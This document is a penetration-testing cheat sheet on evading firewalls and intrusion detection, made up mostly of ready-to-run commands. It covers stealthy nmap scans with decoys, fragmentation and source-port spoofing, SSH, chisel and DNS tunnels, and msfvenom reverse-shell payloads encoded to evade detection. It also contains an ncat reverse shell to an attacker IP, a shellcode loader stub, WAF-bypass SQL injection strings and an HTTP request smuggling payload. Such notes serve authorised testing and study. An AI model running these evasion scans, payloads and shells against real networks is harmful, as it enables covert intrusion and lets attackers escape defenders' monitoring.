# Firewall & IDS Evasion

## Table of Contents
- [[#Introduction|Introduction]]
- [[#Nmap Evasion Techniques|Nmap Evasion Techniques]]
- [[#Proxies & Tunneling|Proxies & Tunneling]]
- [[#Packet Fragmentation|Packet Fragmentation]]
- [[#Decoy Scanning|Decoy Scanning]]
- [[#Source Port Manipulation|Source Port Manipulation]]
- [[#Timing & Throttling|Timing & Throttling]]
- [[#MAC Spoofing|MAC Spoofing]]
- [[#IDS/IPS Evasion|IDS/IPS Evasion]]
- [[#Payload Encoding & Obfuscation|Payload Encoding & Obfuscation]]
- [[#Application Layer Evasion|Application Layer Evasion]]
- [[#Complete Evasion Examples|Complete Evasion Examples]]
- [[#Related Notes|Related Notes]]

---

## Introduction

Firewall and IDS evasion techniques help bypass network security controls during reconnaissance, exploitation, and exfiltration.

### Why Evasion Matters

- Firewalls block ports (stateful/stateless)
- IDS/IPS detect signatures and anomalies
- EDR monitors process behavior
- Network segmentation restricts access

### Categories of Evasion

1. **Packet-level** — fragmentation, spoofing, timing
2. **Proxy-level** — routing through intermediate hosts
3. **Payload-level** — encoding, encryption, polymorphism
4. **Protocol-level** — using allowed protocols (SSH, DNS, HTTPS)

---

## Nmap Evasion Techniques

### Fragment Packets

Split probe packets into smaller fragments to bypass simple filters.

```bash
# Fragment packets (-f)
nmap -f 10.10.14.100

# Fragment with 16-byte MTU
nmap -f -f 10.10.14.100  # Equivalent to --mtu 8

# Custom MTU (must be multiple of 8)
nmap --mtu 16 10.10.14.100
nmap --mtu 32 10.10.14.100
```

### Decoy Scanning (`-D`)

Scan from multiple spoofed IPs to hide your real address.

```bash
# Simple decoy
nmap -D 10.10.14.20 10.10.14.100

# Multiple decoys
nmap -D 10.10.14.20,10.10.14.30,10.10.14.40 10.10.14.100

# Use random decoys
nmap -D RND:10 10.10.14.100

# Include your real IP in the list (ME)
nmap -D 10.10.14.20,ME,10.10.14.30 10.10.14.100

# Random number of decoys
nmap -D RND:20 10.10.14.100
```

> [!note]
> Decoy scanning works best with `-sS` (SYN scan). Targets with rate-limiting may mask results.

### Source Port Manipulation (`--source-port` / `-g`)

Specify a source port that may be allowed through the firewall.

```bash
# Use port 53 (DNS) — often allowed outbound
nmap --source-port 53 10.10.14.100
nmap -g 53 10.10.14.100

# Use port 80 (HTTP)
nmap --source-port 80 10.10.14.100

# Use port 443 (HTTPS)
nmap --source-port 443 10.10.14.100

# Common allowed ports: 20, 21, 53, 80, 443, 8080
```

### Append Random Data

Increase packet size to evade simple pattern matching.

```bash
# Add random data to packets
nmap --data-length 200 10.10.14.100

# Larger payload
nmap --data-length 500 10.10.14.100

# With other options
nmap --data-length 100 -f 10.10.14.100
```

### Modify TTL

```bash
# Set TTL to specific value
nmap --ttl 128 10.10.14.100

# Different TTL values
nmap --ttl 64 10.10.14.100  # Linux default
nmap --ttl 128 10.10.14.100 # Windows default
nmap --ttl 255 10.10.14.100 # Network devices
```

### Spoof MAC Address

```bash
# Spoof MAC to specific vendor
nmap --spoof-mac Cisco 10.10.14.100
nmap --spoof-mac Apple 10.10.14.100
nmap --spoof-mac Dell 10.10.14.100

# Spoof to random MAC
nmap --spoof-mac 0 10.10.14.100

# Spoof to specific MAC
nmap --spoof-mac DE:AD:BE:EF:00:00 10.10.14.100

# Only works on the same subnet
```

### Idle Scan (Zombie Scanning)

Extremely stealthy — uses a "zombie" host to actually send probes.

```bash
# Find a zombie host with incremental IP ID
nmap -sI <zombie_ip> 10.10.14.100

# Example
nmap -sI 10.10.14.50 10.10.14.100 -p 80,443,445
```

---

## Timing & Throttling

Slow down scans to avoid detection by rate-based IDS.

```bash
# Timing templates (-T0 to -T5)
nmap -T0 10.10.14.100  # Paranoid (very slow, evades IDS)
nmap -T1 10.10.14.100  # Sneaky
nmap -T2 10.10.14.100  # Polite
nmap -T3 10.10.14.100  # Normal (default)
nmap -T4 10.10.14.100  # Aggressive (faster)
nmap -T5 10.10.14.100  # Insane (very fast, noisy)
```

### Custom Timing Parameters

```bash
nmap --min-hostgroup 50 --max-hostgroup 100 10.10.14.0/24
nmap --min-parallelism 10 --max-parallelism 100 10.10.14.100
nmap --min-rtt-timeout 100ms --max-rtt-timeout 10000ms --initial-rtt-timeout 500ms 10.10.14.100
nmap --max-retries 2 10.10.14.100
nmap --host-timeout 30m 10.10.14.100
nmap --scan-delay 1s 10.10.14.100    # 1 second between probes
nmap --max-scan-delay 10s 10.10.14.100
```

### Stealth TCP Scans

```bash
# SYN scan (half-open, default as root)
nmap -sS 10.10.14.100

# TCP connect scan (full connection, no raw sockets needed)
nmap -sT 10.10.14.100

# FIN scan (bypasses SYN filters)
nmap -sF 10.10.14.100

# NULL scan
nmap -sN 10.10.14.100

# Christmas tree scan (FIN+PSH+URG)
nmap -sX 10.10.14.100

# ACK scan (maps firewall rules)
nmap -sA 10.10.14.100

# Window scan
nmap -sW 10.10.14.100

# Maimon scan
nmap -sM 10.10.14.100
```

---

## Proxies & Tunneling

Route traffic through intermediate hosts to hide your source.

### SSH Tunnel (SOCKS Proxy)

```bash
# Create SOCKS proxy through SSH
ssh -D 1080 user@pivot_host -N -f

# Route nmap through proxy
proxychains nmap -sT -Pn -p 80,443 10.10.14.100

# /etc/proxychains.conf:
# socks4 127.0.0.1 1080
```

### SSH Local Port Forward

```bash
# Forward a specific port through SSH
ssh -L 8080:10.10.14.100:80 user@jump_host -N -f
# Then access http://localhost:8080
```

### Chisel Tunnel

```bash
# Attacker
chisel server --reverse --port 8000

# Pivot
chisel client 10.10.14.3:8000 R:1080:socks
```

### HTTP Proxy

```bash
# Use Burp Suite or another HTTP proxy
nmap --proxies http://127.0.0.1:8080 10.10.14.100

# Multiple proxy chains
nmap --proxies http://proxy1:8080,http://proxy2:8080 10.10.14.100
```

### DNS Tunneling

```bash
# Using dnscat2
# Server (attacker)
ruby dnscat2.rb --dns host=0.0.0.0,port=53

# Client (compromised host)
./dnscat2 --dns server=attacker_ip

# Iodine DNS tunnel
# Server
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# Client
iodine -f -P password tunnel.domain.com
```

---

## Packet Fragmentation

### IP Fragmentation

```bash
# Nmap -f (fragments packets)
nmap -f 10.10.14.100

# Finer fragmentation
nmap --mtu 8 10.10.14.100

# Cannot combine -f with --mtu
```

### Manual Fragmentation with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *

target = "10.10.14.100"
packets = fragment(IP(dst=target)/ICMP()/"X"*100, fragsize=8)
for pkt in packets:
    send(pkt)
```

---

## Decoy Scanning

Already covered above — particularly effective against:
- Simple IP-based blocklists
- Basic firewall logging
- Single-source detection

```bash
# Most effective decoy scan
nmap -sS -D RND:20,ME 10.10.14.100

# With firewall evasion combo
nmap -sS -D RND:10,ME -f --source-port 53 --data-length 50 -T2 10.10.14.100
```

---

## Source Port Manipulation

Some firewalls allow traffic from specific source ports (DNS=53, HTTP=80).

```bash
# Most common allowed ports for source (-g is short for --source-port)
nmap -g 53 10.10.14.100
nmap --source-port 20 10.10.14.100  # FTP data
nmap --source-port 22 10.10.14.100  # SSH
nmap --source-port 80 10.10.14.100  # HTTP
nmap --source-port 443 10.10.14.100 # HTTPS
nmap --source-port 8080 10.10.14.100 # HTTP alternative
```

---

## MAC Spoofing

Already covered above — useful for MAC-based allowlists.

---

## IDS/IPS Evasion

### Application Layer Obfuscation

```bash
# HTTP request obfuscation
curl --header "X-Forwarded-For: 127.0.0.1" http://target/
curl --header "User-Agent: Mozilla/5.0" http://target/

# HTTP methods
curl -X POST http://target/
curl -X PUT http://target/
```

### Nmap Script Evasion

```bash
# Disable reverse DNS (reduces DNS lookups that could alert)
nmap -n 10.10.14.100

# Skip host discovery (treat as up)
nmap -Pn 10.10.14.100

# Disable ping
nmap -Pn -n 10.10.14.100
```

### SSL/TLS Encrypted Scans

```bash
# Scan over TLS
nmap --script ssl-enum-ciphers -p 443 10.10.14.100

# Use SSL for payload delivery
ncat --ssl -lvnp 4444
# Target: ncat --ssl -e /bin/bash 10.10.14.3 4444
```

---

## Payload Encoding & Obfuscation

### MSFVenom Encoding

```bash
# Encode x64 payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -e x64/zutto_dekiru -i 9 -o encoded.exe

# Shikata Ga Nai (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o encoded_x86.exe

# With bad characters
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -e x64/zutto_dekiru -i 5 -b "\x00\x0a\x0d"
```

### Custom Shellcode Loaders

```python
# Basic XOR-encoded shellcode runner
shellcode = b"\xfc\x48\x83\xe4..."
key = 0xAA
encoded = bytes([b ^ key for b in shellcode])

# Decode at runtime
decoded = bytes([b ^ key for b in encoded])
```

### Using Packers

```bash
# UPX packer
upx -9 payload.exe -o packed.exe

# ConfuserEx (C# obfuscation)

# Veil framework
veil
```

---

## Application Layer Evasion

### Web Application Firewall (WAF) Bypass

```bash
# SQL injection payload obfuscation
# Basic: 1' OR '1'='1
# Bypass: 1'/*!12345OR*/'1'='1

# Case variation
UnIoN SeLeCt 1,2,3

# URL encoding
%75%6e%69%6f%6e%20%73%65%6c%65%63%74

# Double URL encoding
%25%37%35%25%36%65...

# HTTP Parameter Pollution (HPP)
?param=1&param=2&param=3
```

### HTTP Smuggling

```text
CL.TE (Content-Length vs Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

---

## Complete Evasion Examples

### Extremely Stealthy Nmap Scan

```bash
# Combines everything
nmap -sS \
     -T2 \
     -f \
     --source-port 53 \
     --data-length 100 \
     -D RND:15,ME \
     --spoof-mac 0 \
     --ttl 128 \
     -n \
     -Pn \
     --max-retries 1 \
     --scan-delay 1s \
     -p 80,443,22,445,3389 \
     10.10.14.100
```

### Firewall Bypass Scan

```bash
# Bypass specific firewall rules
nmap -sT -Pn -n --source-port 53 -g 53 -f --mtu 16 10.10.14.100

# Through proxy
proxychains nmap -sT -Pn -sV -p 80,443,8080 10.10.14.100

# Use alternative scan types
nmap -sN 10.10.14.100     # NULL scan (bypasses some SYN filters)
nmap -sF 10.10.14.100     # FIN scan
nmap -sA 10.10.14.100     # ACK scan (maps firewall rules)
```

### IDS Evasion with Timing

```bash
# Very slow scan
nmap -T0 -sS -Pn -p 1-1000 10.10.14.100
# This can take hours but rarely triggers IDS
```

### Bypassing Rate Limiting

```bash
# Scan over long period
nmap --scan-delay 10s -sS -p 80 10.10.14.100

# Randomize target order
nmap --randomize-hosts 10.10.14.0/24

# Scan from multiple sources
nmap -S 10.10.14.50 -e eth0:1 10.10.14.100
```

---

## Quick Reference

### Nmap Evasion Flags

| Flag | Description |
|------|-------------|
| `-f` | Fragment packets |
| `--mtu <size>` | Custom MTU (multiple of 8) |
| `-D <decoy1,decoy2,ME>` | Decoy scan |
| `-g <port>` or `--source-port <port>` | Source port |
| `--data-length <size>` | Append random data |
| `--ttl <value>` | Set TTL |
| `--spoof-mac <vendor/prefix/0>` | MAC spoofing |
| `-T0` to `-T2` | Slow timing |
| `--scan-delay <time>` | Delay between probes |
| `--max-retries <n>` | Limit retries |
| `-n` | No DNS resolution |
| `-Pn` | Skip host discovery |
| `-sS`, `-sT`, `-sF`, `-sN`, `-sX`, `-sA`, `-sM` | Various scan types |

### Proxychains with Nmap

```bash
# /etc/proxychains.conf must have socks4/5 configured
proxychains nmap -sT -Pn -sV -p 80,443,22,445 10.10.14.100

# NEVER use -sS with proxychains (SYN scan needs raw sockets)
```

### Best Practices

1. Start with `-T2` or `-T1` for stealth
2. Always use `-Pn` and `-n` to minimize probe traffic
3. Fragment packets with `-f` or `--mtu`
4. Use decoys to obscure source
5. Set source port to commonly allowed ports (53, 80, 443)
6. Use proxy chains for additional anonymity
7. Avoid default nmap timing (T3) — too aggressive for stealth

---

## Related Notes

- [[06 - Shells and Payloads/6.4 Payload Generation/MSFVenom Reference]]
- [[12 - Pivoting and Port Forwarding/Pivoting Techniques]]
- [[05 - Network Attacks/5.1 Sniffing and Spoofing/Network Attacks]]
- [[07 - Metasploit Framework/Metasploit Complete]]
